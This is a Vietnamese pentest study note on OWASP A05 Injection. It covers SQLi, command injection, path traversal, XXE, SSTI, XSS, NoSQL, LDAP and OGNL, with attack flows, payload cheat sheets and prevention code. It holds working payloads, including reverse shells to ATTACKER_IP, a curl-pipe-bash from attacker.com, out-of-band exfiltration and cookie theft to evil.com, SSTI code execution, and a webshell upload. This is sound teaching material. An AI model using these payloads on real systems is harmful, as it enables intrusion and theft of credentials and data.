# A05 – Injection

> **OWASP Top 10:2025 · #5** — Giảm từ #3 (2021) xuống #5, nhưng vẫn là danh mục có **nhiều CVE nhất** trong toàn bộ Top 10 với 62,445 CVEs và 37 CWEs được map. Injection là một trong những lỗ hổng được test nhiều nhất — **100% ứng dụng đều được kiểm tra một dạng injection nào đó**. XSS (CWE-79) chiếm hơn 30,000 CVEs và SQLi chiếm hơn 14,000 CVEs — hai sub-category này là trọng tâm của mọi pentest.

| Metric | Số liệu |
|---|---|
| CWE được map | 37 (nhiều CVEs nhất Top 10) |
| CVEs liên quan | 62,445 |
| Tổng số lần xuất hiện | 1,404,249 |
| Tỉ lệ xuất hiện trung bình | 3.08% |
| Avg Weighted Exploit | 7.15 |

Notable CWEs: **CWE-79** (XSS, 30k+ CVEs), **CWE-89** (SQLi, 14k+ CVEs), **CWE-78** (OS Command Injection), **CWE-94** (Code Injection), **CWE-917** (Expression Language Injection).

---

## 📖 Concept

Injection xảy ra khi **untrusted user input được gửi tới interpreter** (database, OS shell, XML parser, template engine, ...) và interpreter **thực thi input đó như là lệnh** thay vì xử lý nó như dữ liệu thuần túy.

> ⚠️ Nguyên tắc cốt lõi: **Data và Command phải tách biệt hoàn toàn**. Khi chúng bị trộn lẫn trong cùng một chuỗi string, injection xảy ra.

### Ứng dụng dễ bị injection khi:

| Điều kiện | Ví dụ |
|---|---|
| User input không được validate/sanitize | `id=123'` → lỗi SQL |
| Dynamic query dùng string concatenation | `"SELECT * FROM users WHERE id='" + id + "'"` |
| Input được truyền thẳng vào interpreter | `exec("ping " + domain)` |
| ORM query concatenate thay vì parameterize | `session.createQuery("FROM users WHERE name='" + name + "'")` |
| Input được dùng trong template engine | `render("Hello " + username)` |
| Input được dùng làm đường dẫn file | `open("/images/" + filename)` |

### Các interpreter phổ biến là injection target

| Interpreter | Attack type |
|---|---|
| SQL Database | SQL Injection (SQLi) |
| OS Shell | OS Command Injection |
| Filesystem | Path Traversal |
| XML Parser | XXE (XML External Entity) |
| Template Engine | SSTI (Server-Side Template Injection) |
| HTML/Browser DOM | XSS (Cross-Site Scripting) |
| LDAP Server | LDAP Injection |
| Expression Language (EL) | EL/OGNL Injection |
| NoSQL Database | NoSQL Injection |

---

## 🎯 Các dạng tấn công

---

### 1. SQL Injection (SQLi) — `Critical`

App nhúng user input trực tiếp vào SQL query → attacker kiểm soát cấu trúc query, đọc/sửa/xóa data, bypass auth, trong nhiều trường hợp escalate lên RCE.

#### 1.1. Classic SQLi – Login Bypass

```sql
-- Query gốc:
SELECT * FROM users WHERE username='$user' AND password='$pass'

-- Payload: username = admin'--
-- Query sau khi inject:
SELECT * FROM users WHERE username='admin'--' AND password='anything'
-- Comment (--) bỏ qua toàn bộ điều kiện password → login thành admin
```

#### 1.2. UNION Attack – Data Extraction

UNION cho phép append thêm một SELECT query để leak data từ bảng khác.

```
Bước 1 – Xác định số column:
' ORDER BY 1--      → OK
' ORDER BY 2--      → OK
' ORDER BY 3--      → Error! → có 2 column

Hoặc:
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--    → đến khi không lỗi

Bước 2 – Tìm column kiểu string (để hiển thị text):
' UNION SELECT 'a',NULL--
' UNION SELECT NULL,'a'--

Bước 3 – Leak data:
' UNION SELECT username,password FROM users--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

#### 1.3. Database Fingerprinting

```sql
-- MySQL / MariaDB
' UNION SELECT @@version,NULL--
' UNION SELECT version(),NULL--

-- PostgreSQL
' UNION SELECT version(),NULL--

-- Oracle
' UNION SELECT banner,NULL FROM v$version--
' UNION SELECT version,NULL FROM v$instance--
-- (Oracle yêu cầu FROM clause: dùng FROM dual cho query không cần table)
' UNION SELECT NULL,NULL FROM dual--

-- Microsoft SQL Server
' UNION SELECT @@version,NULL--
```

#### 1.4. Blind SQLi – Boolean-Based

```
-- Server không hiển thị error hay data, nhưng response KHÁC NHAU (true/false)
-- Ví dụ: Cookie tracking
Cookie: TrackingId=xyz' AND '1'='1    → Welcome back (true)
Cookie: TrackingId=xyz' AND '1'='2    → Không có Welcome (false)

-- Extract password từng ký tự:
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='b
...
-- Dùng Burp Intruder để brute-force từng vị trí
```

#### 1.5. Blind SQLi – Error-Based

```sql
-- Trigger error có chứa data (PostgreSQL)
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
-- → ERROR: invalid input syntax for integer: "s3cr3tp4ss" (leak password trong error msg!)

-- Oracle
' AND 1=(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '1' END FROM dual)--
```

#### 1.6. Blind SQLi – Time-Based

```sql
-- Không có sự khác biệt response content → dùng time delay

-- PostgreSQL
'; SELECT pg_sleep(10)--
' AND (SELECT 1 FROM pg_sleep(10))--

-- MySQL
'; SELECT SLEEP(10)--
' AND SLEEP(10)--

-- Microsoft SQL Server
'; EXEC xp_cmdshell('ping 127.0.0.1 -n 10')--
'; IF (1=1) WAITFOR DELAY '0:0:10'--

-- Oracle
' AND 1=1 AND dbms_pipe.receive_message(('a'),10)=1--
```

#### 1.7. Out-of-Band (OOB) SQLi

```sql
-- Khi blind không dùng được (async, firewall block) → trigger DNS/HTTP request ra ngoài
-- MySQL
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.evil.com\\a'))--

-- Microsoft SQL Server (cần xp_cmdshell hoặc linked server)
'; EXEC master..xp_cmdshell('nslookup '+(SELECT password FROM users)+'.attacker.com'--

-- PostgreSQL (cần COPY TO / dblink)
'; COPY (SELECT password FROM users) TO PROGRAM 'curl http://attacker.com/'||password--
```

#### 1.8. SQLi trong các ngữ cảnh khác

```
-- ORDER BY clause (không thể dùng UNION/WHERE escape thông thường)
GET /products?sort=price   →  thử: price,1=(SELECT 1)--

-- XML/JSON body
POST /api/stock
<storeId>999 &#x55;NION SELECT password FROM users--</storeId>
-- XML entity encode để bypass WAF: &#x53;ELECT = SELECT

-- Second-order SQLi: input lưu an toàn, nhưng bị inject khi retrieve sau
-- Ví dụ: đăng ký username = admin'-- → khi đổi password dùng username này trong query
```

---

### 2. OS Command Injection — `Critical`

App gọi OS shell command và nhúng user input vào → attacker thực thi lệnh tùy ý trên server.

#### 2.1. Basic Command Injection

```
# App gốc:
stockreport.pl 381 29

# Attacker inject separator:
productID=381 & echo aiwefwlguh &
→ Executes: stockreport.pl 381 & echo aiwefwlguh & 29
```

**Shell separators phổ biến:**

```
&       command1 & command2      (run cả hai, sequential)
&&      command1 && command2     (run command2 nếu command1 thành công)
|       command1 | command2      (pipe output)
||      command1 || command2     (run command2 nếu command1 fail)
;       command1; command2       (sequential, luôn chạy cả hai, *nix only)
`cmd`   command injection via backtick (inline execution)
$(cmd)  command substitution
\n / %0a  newline separator
```

#### 2.2. Blind Command Injection – Time Delay

```bash
# Không thấy output trực tiếp → dùng thời gian phản hồi để confirm
& ping -c 10 127.0.0.1 &
|| sleep 10 ||
; sleep 10;
```

#### 2.3. Blind Command Injection – Output Redirect

```bash
# Ghi output vào file trong web root, rồi đọc qua browser
& whoami > /var/www/images/output.txt &
# Truy cập: https://target.com/images/output.txt
```

#### 2.4. Blind Command Injection – Out-of-Band (OAST)

```bash
# DNS lookup ra ngoài (Burp Collaborator)
& nslookup $(whoami).BURP_COLLABORATOR_DOMAIN &
& nslookup `whoami`.BURP_COLLABORATOR_DOMAIN &

# HTTP request ra ngoài với data
& curl http://BURP_COLLABORATOR_DOMAIN/$(cat /etc/passwd | base64) &
```

#### 2.5. Useful Commands

| Mục đích | Linux | Windows |
|---|---|---|
| Current user | `whoami` | `whoami` |
| OS info | `uname -a` | `ver` |
| Network | `ifconfig` / `ip a` | `ipconfig /all` |
| Processes | `ps aux` | `tasklist` |
| Files | `ls -la` / `cat /etc/passwd` | `dir` / `type file.txt` |
| Hostname | `hostname` | `hostname` |

---

### 3. Path Traversal (Directory Traversal) — `High`

App dùng user input để construct đường dẫn file → attacker đọc file tùy ý trên server.

#### 3.1. Basic Path Traversal

```
# App gốc:
GET /loadImage?filename=218.png
→ Đọc: /var/www/images/218.png

# Payload cơ bản (Linux):
GET /loadImage?filename=../../../etc/passwd
→ Đọc: /var/www/images/../../../etc/passwd = /etc/passwd

# Windows:
GET /loadImage?filename=..\..\..\windows\win.ini
```

#### 3.2. Bypass Techniques

```
# 1. URL encoding
../           →  %2e%2e%2f  hoặc  ..%2f  hoặc  %2e%2e/

# 2. Double URL encoding (bypass WAF decode lần 1)
../           →  %252e%252e%252f

# 3. Non-standard encoding
../           →  ..%c0%af  (overlong UTF-8)
../           →  ..%ef%bc%8f (Unicode full-width slash)

# 4. Null byte (PHP < 5.3.4 — terminate string sau extension check)
../../../etc/passwd%00.png

# 5. Filter bypass: strip "../" một lần → "....// " → sau strip còn "../"
....//....//....//etc/passwd

# 6. Absolute path (nếu app chỉ check relative prefix)
GET /loadImage?filename=/etc/passwd

# 7. Start with expected base path (nếu app require prefix)
GET /loadImage?filename=/var/www/images/../../../etc/passwd
```

#### 3.3. Files hay đọc

```
# Linux
/etc/passwd         → username, home dir
/etc/shadow         → password hash (thường cần root)
/etc/hosts          → internal hostname mapping
/proc/self/environ  → environment variables (có thể chứa secrets)
/proc/self/cmdline  → lệnh đang chạy
/var/log/apache2/access.log  → log injection (→ LFI to RCE)

# Windows
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\Users\Administrator\.ssh\id_rsa
```

---

### 4. XXE (XML External Entity) Injection — `High`

XML parser được cấu hình cho phép external entity → attacker inject DOCTYPE để đọc file hoặc thực hiện SSRF.

> 💡 XXE đã được cover chi tiết ở A02 (Security Misconfiguration). Đây là phần tóm tắt và tổng hợp các kỹ thuật nâng cao.

#### 4.1. Basic XXE – File Read

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

#### 4.2. XXE → SSRF

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

#### 4.3. Blind XXE – Out-of-Band

```xml
<!-- Bước 1: Gửi request trigger OOB -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://COLLABORATOR/evil.dtd">
  %xxe;
]>
<foo>test</foo>

<!-- Bước 2: evil.dtd hosted trên attacker server -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLABORATOR/?x=%file;'>">
%eval;
%exfil;
```

#### 4.4. XXE via File Upload (SVG)

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

#### 4.5. XInclude Attack

```xml
<!-- Khi không control root element, nhưng server parse XInclude -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

---

### 5. Server-Side Template Injection (SSTI) — `Critical`

User input được nhúng trực tiếp vào template và được **rendered bởi template engine** → attacker inject template expression → RCE.

#### 5.1. Detection – Identify Template Engine

```
# Bước 1: Thử fuzzing string để trigger lỗi
${{<%['"}}%\

# Bước 2: Inject expression toán học để detect
{{7*7}}           → 49   (Twig, Jinja2, Pebble)
${7*7}            → 49   (FreeMarker, Thymeleaf, Velocity)
<%= 7*7 %>        → 49   (ERB – Ruby)
#{7*7}            → 49   (Pebble)
*{7*7}            → 49   (Thymeleaf – Spring)
{{ 7 * '7' }}     → 49   (Jinja2 Python) vs '7777777' (Twig PHP)
```

**Decision tree:**

```
Inject {{7*7}}
  ├─ Output = 49     → Jinja2 (Python) hoặc Twig (PHP)
  │    └─ Inject {{7*'7'}}
  │         ├─ 49        → Jinja2
  │         └─ '7777777' → Twig
  └─ Output = {{7*7}} (not rendered)
       └─ Inject ${7*7}
            ├─ 49        → FreeMarker/Smarty
            └─ No        → Thử ERB, Velocity...
```

#### 5.2. SSTI Exploit – Jinja2 (Python/Flask)

```python
# RCE via Jinja2
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Bypass sandbox (object traversal)
{{''.__class__.__mro__[1].__subclasses__()}}
# Tìm subprocess.Popen hoặc os._wrap_close trong list subclass

# Đơn giản hơn nếu không có filter:
{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}

# Đọc file
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
```

#### 5.3. SSTI Exploit – Twig (PHP)

```php
# RCE via Twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Thay 'id' bằng lệnh muốn thực thi
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
```

#### 5.4. SSTI Exploit – FreeMarker (Java)

```
<#assign ex = "freemarker.template.utility.Execute"?new()>
${ex("id")}

# Hoặc
${"freemarker.template.utility.Execute"?new()("id")}
```

#### 5.5. SSTI Exploit – ERB (Ruby)

```ruby
<%= system("whoami") %>
<%= `whoami` %>
<%= IO.popen('id').readlines() %>
```

#### 5.6. SSTI Exploit – Thymeleaf (Java/Spring)

```
// Expression Language injection trong Spring
__${T(java.lang.Runtime).getRuntime().exec("whoami")}__::.x
${T(java.lang.Runtime).getRuntime().exec(new String[]{"sh","-c","id"})}
```

---

### 6. Cross-Site Scripting (XSS) — `High` (High frequency / Lower server-side impact)

User input được reflect/store vào HTML page mà không escape → browser execute JavaScript của attacker.

> 💡 XSS được OWASP phân loại trong Injection vì cùng root cause (untrusted input → interpreter). Có 3 loại chính: Reflected, Stored, DOM-based.

#### 6.1. Reflected XSS

```html
<!-- App reflect input vào page không encode -->
GET /search?q=<script>alert(1)</script>
→ Response: <p>Results for: <script>alert(1)</script></p>

<!-- Đánh cắp cookie (thực tế hơn) -->
GET /search?q=<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
```

#### 6.2. Stored XSS

```html
<!-- Inject vào comment, profile, message... được lưu DB và hiển thị cho user khác -->
POST /comment
body=<script>document.location='https://evil.com/steal?c='+document.cookie</script>

<!-- Self-XSS → XSS qua stored profile name (hiển thị trong error: "Hello <name>!") -->
```

#### 6.3. DOM-Based XSS

```html
<!-- Sink: innerHTML, document.write, eval(), setTimeout(str)... -->
<!-- Source: location.hash, location.search, document.referrer, window.name -->

<!-- Ví dụ: app đọc hash và ghi vào DOM -->
<script>
  document.getElementById('welcome').innerHTML = decodeURIComponent(location.hash.slice(1));
</script>
<!-- Payload: https://target.com/page#<img src=x onerror=alert(1)> -->

<!-- JavaScript URL sink -->
<a href="javascript:alert(1)">Click me</a>
```

#### 6.4. XSS Payload phổ biến

```html
<!-- Basic -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

<!-- Attribute context (không có quotes) -->
" onmouseover="alert(1)
' onmouseover='alert(1)

<!-- JavaScript context -->
</script><script>alert(1)</script>
';alert(1)//

<!-- Filter bypass: case variation, encoding -->
<ScRiPt>alert(1)</ScRiPt>
<img src=x oNeRrOr=alert(1)>
<script>&#97;&#108;&#101;&#114;&#116;(1)</script>

<!-- WAF bypass: không dùng từ "script" -->
<details open ontoggle=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
```

---

### 7. NoSQL Injection — `High`

NoSQL database (MongoDB, CouchDB, ...) dùng operator đặc biệt → nếu user input không sanitize → operator injection hoặc JS injection.

```javascript
// MongoDB: query login
db.users.find({username: username, password: password})

// Inject bằng JSON (nếu app parse trực tiếp):
POST /login
{"username": "admin", "password": {"$ne": null}}
// $ne = not equal → password != null → luôn true → bypass login!

// Operator injection khác:
{"$gt": ""}     // greater than empty string → true cho mọi string
{"$regex": "."} // match bất kỳ string
{"$where": "sleep(1000)"}  // thực thi JS → time-based blind (nếu server dùng $where)

// NoSQL injection trong URL param:
GET /products?category[$ne]=null
GET /products?price[$gt]=0
```

---

### 8. LDAP Injection — `Medium`

```
# LDAP query gốc:
(&(uid=USERNAME)(userPassword=PASSWORD))

# Inject vào username field:
admin)(&)           → (&(uid=admin)(&)(userPassword=anything))
                    → Luôn true, bypass auth
admin)(&(password=*   → tương tự
*                   → match tất cả users
```

---

### 9. Expression Language (EL) / OGNL Injection — `Critical`

```java
// Java EE Expression Language
// Nếu error message hoặc field reflect EL expression
${7*7}              // → 49
${System.getenv()}  // → lộ environment
${"".class.forName("java.lang.Runtime").getMethod("exec","".class).invoke(...)}

// OGNL (Apache Struts - CVE-2017-5638, CVE-2018-11776)
%{(#_memberAccess['allowStaticMethodAccess']=true)(#cmd='whoami')(#cmds={'/bin/bash','-c',#cmd})(#p=new java.lang.ProcessBuilder(#cmds))(#p.redirectErrorStream(true))(#process=#p.start())(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))(...))}
```

---

### ⚠️ Hai dạng hay bị bỏ sót

**Second-Order SQLi** — Input được lưu an toàn (với escaping), nhưng được retrieve và sử dụng trong query sau đó mà không sanitize. Thường gặp trong profile update, username change flow.

**SQLi trong JSON/XML body** — WAF thường chỉ check query param. Nhiều app nhận JSON/XML và pass sang SQL query. XML body cho phép encode payload (`&#x53;ELECT` = `SELECT`) để bypass WAF.

---

## 🔍 Dấu hiệu nhận biết

| Mức độ | Dấu hiệu | Cần làm |
|---|---|---|
| 🔴 High | SQL error khi thêm `'` vào parameter | Confirm SQLi, thử UNION, dùng sqlmap |
| 🔴 High | App gọi OS command (ping, nslookup, curl,...) | Thử `;id`, `&whoami`, `\|\|sleep 5` |
| 🔴 High | Template expression render trong output (`{{7*7}}` → 49) | Xác định engine, leo thang RCE |
| 🔴 High | `?file=`, `?page=`, `?path=`, `?template=` trong URL | Thử `../../../etc/passwd` |
| 🟡 Med | Input reflect trong HTML không encode | Thử `<script>alert(1)</script>` |
| 🟡 Med | Endpoint nhận XML body | Test XXE với DOCTYPE injection |
| 🟡 Med | App dùng MongoDB, nhận JSON có nested object | Test `{"$ne": null}`, `{"$gt": ""}` |
| 🟡 Med | Boolean response thay đổi theo input | Thử Boolean-based blind SQLi |
| 🔵 Low | Response delay khi inject `sleep(5)` | Confirm time-based blind |
| 🔵 Low | `?sort=`, `?order=`, `?column=` | Thử SQLi trong ORDER BY |

---

## 🧠 Attack Flow – Methodology

### SQL Injection – Full Flow

```
1. Detect
   └─ Thêm ' vào mọi parameter → xem có SQL error không?
   └─ Thêm ' AND '1'='1 vs ' AND '1'='2 → boolean response khác nhau?
   └─ ' AND SLEEP(5)-- → response chậm hơn 5s?
   └─ Dùng Burp Scanner hoặc sqlmap để automate

2. Xác định kiểu database
   └─ @@version (MySQL/MSSQL), version() (PG), banner FROM v$version (Oracle)
   └─ DUAL table (Oracle), SLEEP vs pg_sleep vs WAITFOR DELAY

3. UNION-based (nếu response visible)
   └─ ORDER BY 1--, 2--, 3-- → xác định số column
   └─ UNION SELECT NULL,NULL... → tìm column kiểu string
   └─ UNION SELECT table_name,NULL FROM information_schema.tables--
   └─ UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
   └─ UNION SELECT username,password FROM users--

4. Blind (nếu không thấy output)
   └─ Boolean: AND SUBSTRING(data,1,1)='a'-- (Burp Intruder để brute-force)
   └─ Error-based: 1=CAST((SELECT password LIMIT 1) AS int)
   └─ Time-based: IF(1=1, SLEEP(5), 0)
   └─ OOB: DNS lookup với data trong subdomain

5. Escalate
   └─ Đọc file system (MySQL: LOAD_FILE, MSSQL: OPENROWSET)
   └─ Ghi file (MySQL: INTO OUTFILE → webshell)
   └─ RCE (MSSQL: xp_cmdshell, PostgreSQL: COPY TO PROGRAM)
   └─ sqlmap --os-shell để automate
```

### OS Command Injection – Testing Flow

```
1. Tìm input đi vào OS command
   └─ URL param: ?host=, ?domain=, ?ip=, ?cmd=
   └─ Form field: ping target, traceroute, nslookup
   └─ Filename trong upload
   └─ Bất kỳ input nào app có thể dùng để call external program

2. Test với time delay trước (non-destructive)
   └─ & ping -c 5 127.0.0.1 & (Linux)
   └─ & ping -n 5 127.0.0.1 & (Windows)
   └─ || sleep 5
   └─ Response chậm hơn 5s → confirmed

3. Test output visibility
   └─ & echo vulnerable & → xem có "vulnerable" trong response không?
   └─ & whoami & → xem có username không?

4. Escalate
   └─ & cat /etc/passwd &
   └─ & ls -la /home/ &
   └─ & curl http://attacker.com/shell.sh | bash & (reverse shell)

5. Blind: OOB
   └─ & nslookup $(whoami).COLLABORATOR &
   └─ & curl http://COLLABORATOR/$(cat /etc/passwd | base64) &
```

### Path Traversal – Testing Flow

```
1. Tìm file-serving parameter
   └─ ?filename=, ?file=, ?path=, ?template=, ?image=, ?page=
   └─ /loadImage?filename=, /download?file=

2. Test basic traversal
   └─ ../../../etc/passwd
   └─ ..\..\..\windows\win.ini (Windows)

3. Nếu bị block → bypass
   └─ URL encode: %2e%2e%2f
   └─ Double encode: %252e%252e%252f
   └─ Non-standard: ..%c0%af, ..%ef%bc%8f
   └─ Strip bypass: ....//....//....//etc/passwd
   └─ Null byte: ../../../etc/passwd%00.png
   └─ Absolute path: /etc/passwd (nếu validation chỉ check relative)

4. Target sensitive files
   └─ /etc/passwd, /etc/shadow (thường cần root)
   └─ /proc/self/environ (secrets trong env)
   └─ App config files, private keys

5. Test write traversal (nếu có upload feature)
   └─ Upload file với path ../../../var/www/html/shell.php → webshell!
```

### SSTI – Testing Flow

```
1. Inject math expression vào mọi input
   └─ {{7*7}}, ${7*7}, #{7*7}, *{7*7}, <%= 7*7 %>
   └─ Thử trong: tên profile, header, cookie, URL param, form field

2. Nếu thấy 49 → xác định engine
   └─ {{7*'7'}} → 49 (Jinja2) vs 7777777 (Twig)
   └─ Xem error stack trace có hint về framework không

3. Tham chiếu payload theo engine
   └─ Jinja2: object traversal → subclasses → subprocess/os
   └─ Twig: _self.env.registerUndefinedFilterCallback
   └─ FreeMarker: Execute?new()
   └─ ERB: <%= system("id") %>

4. Escalate → RCE
   └─ Chạy 'id', 'whoami'
   └─ Đọc file: cat /etc/passwd
   └─ Reverse shell
```

---

## 💣 Payloads

### SQL Injection – Quick Reference

```sql
-- Auth bypass
' OR 1=1--
' OR '1'='1
admin'--
' OR 1=1#        (MySQL)
' OR 1=1/*       (MySQL)

-- UNION: detect columns (thêm NULL cho đến khi không lỗi)
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- Version fingerprinting (thay vào UNION)
@@version         -- MySQL, MSSQL
version()         -- PostgreSQL
banner FROM v$version  -- Oracle (cần UNION SELECT banner,NULL FROM v$version--)

-- DB listing
SELECT table_name FROM information_schema.tables        -- MySQL/PG/MSSQL
SELECT table_name FROM all_tables                       -- Oracle

-- Column listing
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- String concatenation (để combine 2 values vào 1 column)
username || '~' || password                -- Oracle, PostgreSQL
CONCAT(username,'~',password)              -- MySQL
username + '~' + password                  -- MSSQL

-- Time delay
SLEEP(5)                    -- MySQL
pg_sleep(5)                 -- PostgreSQL
WAITFOR DELAY '0:0:5'       -- MSSQL
dbms_pipe.receive_message(('a'),5)  -- Oracle

-- Comment syntax
--              -- MySQL, MSSQL, PostgreSQL, Oracle
#               -- MySQL
/**/            -- tất cả

-- Bypass filter (space alternatives)
SELECT/**/username/**/FROM/**/users
SEL/**/ECT username FROM users
SELECT%09username%09FROM%09users   (tab)
```

### OS Command Injection – Quick Reference

```bash
# Command separators (thử tất cả)
; id
& id
&& id
| id
|| id
`id`
$(id)
%0a id          # URL-encoded newline

# Reverse shell (sau khi confirm injection)
; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 ;
& bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' &
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["sh","-i"])' ;

# OOB exfiltration
& nslookup $(whoami).COLLABORATOR_DOMAIN &
& curl "http://COLLABORATOR_DOMAIN/$(whoami)" &
& curl "http://COLLABORATOR_DOMAIN/$(cat /etc/passwd | base64 -w0)" &
```

### Path Traversal – Quick Reference

```
# Basic
../../../etc/passwd
../../../etc/shadow
../../../proc/self/environ
../../../var/log/apache2/access.log

# Windows
..\..\..\windows\win.ini
..\..\..\windows\system32\drivers\etc\hosts

# Bypass encoding
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd       # double encode
%2e%2e/%2e%2e/%2e%2e/etc/passwd
....//....//....//etc/passwd              # strip bypass
../../../etc/passwd%00.png                # null byte (PHP <5.3.4)
/etc/passwd                               # absolute path
/var/www/images/../../../etc/passwd       # require base path prefix
```

### SSTI – Quick Reference by Engine

```python
# Jinja2 (Python/Flask)
{{7*7}}
{{config}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Twig (PHP)
{{7*7}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# FreeMarker (Java)
${7*7}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# ERB (Ruby)
<%= 7*7 %>
<%= system("id") %>
<%= `id` %>

# Velocity (Java)
#set($rt = $class.forName("java.lang.Runtime"))
#set($proc = $rt.getRuntime().exec("id"))

# Thymeleaf (Spring)
__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x
```

### XXE – Quick Reference

```xml
<!-- File read -->
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>

<!-- SSRF -->
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>

<!-- SVG -->
<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```

### XSS – Quick Reference

```html
<!-- Basic -->
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- Steal cookie -->
<script>document.location='https://evil.com/steal?c='+document.cookie</script>
<img src=x onerror="fetch('https://evil.com/steal?c='+btoa(document.cookie))">

<!-- CSP bypass via JSONP -->
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>

<!-- DOM XSS via hash -->
https://target.com/#<img src=x onerror=alert(1)>
```

---

## 🛡️ Prevention

### Nguyên tắc: Tách Data khỏi Command/Query

> Cách phòng chống injection duy nhất hoàn toàn hiệu quả là **không bao giờ cho user input tiếp xúc với interpreter như một phần của command/query structure**. Parameterization và input validation là hai lớp bảo vệ bổ sung cho nhau.

### Fix SQL Injection: Parameterized Query

```python
# ❌ String concatenation
query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"
cursor.execute(query)

# ✅ Parameterized query (prepared statement)
query = "SELECT * FROM users WHERE username = %s AND password = %s"
cursor.execute(query, (username, password))  # Input xử lý riêng, không nhúng vào SQL

# ✅ ORM (SQLAlchemy)
user = session.query(User).filter_by(username=username, password=password).first()
```

```java
// ✅ Java PreparedStatement
PreparedStatement ps = conn.prepareStatement(
    "SELECT * FROM users WHERE username=? AND password=?"
);
ps.setString(1, username);
ps.setString(2, password);
```

### Fix OS Command Injection

```python
# ❌ Shell injection via string
import subprocess
result = subprocess.run(f"ping {host}", shell=True)

# ✅ Không dùng shell=True, truyền array riêng
result = subprocess.run(["ping", "-c", "4", host], shell=False)
# Với shell=False, "host" là argument đơn thuần — không thể inject separator

# ✅ Nếu phải call OS: whitelist input
ALLOWED_HOSTS = ["192.168.1.1", "10.0.0.1"]
if host not in ALLOWED_HOSTS:
    raise ValueError("Invalid host")
```

### Fix Path Traversal

```python
# ❌ Dùng user input làm path trực tiếp
filepath = os.path.join("/var/www/images/", filename)
return open(filepath).read()

# ✅ Validate canonical path sau khi resolve
import os
BASE_DIR = "/var/www/images/"
filepath = os.path.realpath(os.path.join(BASE_DIR, filename))
if not filepath.startswith(os.path.realpath(BASE_DIR)):
    raise PermissionError("Path traversal detected!")
return open(filepath).read()

# ✅ Whitelist filename (tốt nhất)
ALLOWED_FILES = {"product1.png", "product2.png", "product3.png"}
if filename not in ALLOWED_FILES:
    raise ValueError("Invalid filename")
```

### Fix SSTI

```python
# ❌ Render user input như template expression
from jinja2 import Template
template = Template(f"Hello {user_input}")  # SSTI!
result = template.render()

# ✅ Render với variable (không phải expression)
from jinja2 import Environment
env = Environment()
template = env.from_string("Hello {{ name }}")
result = template.render(name=user_input)  # user_input là data, không phải template code
```

### Fix XSS: Output Encoding

```python
# ❌ Reflect input vào HTML không encode
return f"<p>Search results for: {query}</p>"

# ✅ HTML entity encode
import html
return f"<p>Search results for: {html.escape(query)}</p>"
```

```javascript
// ❌ DOM manipulation với string concatenation
element.innerHTML = userInput;

// ✅ Dùng textContent (auto-escape)
element.textContent = userInput;
// Hoặc DOM methods
const text = document.createTextNode(userInput);
element.appendChild(text);
```

### Fix XXE: Disable External Entities

```java
// Java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
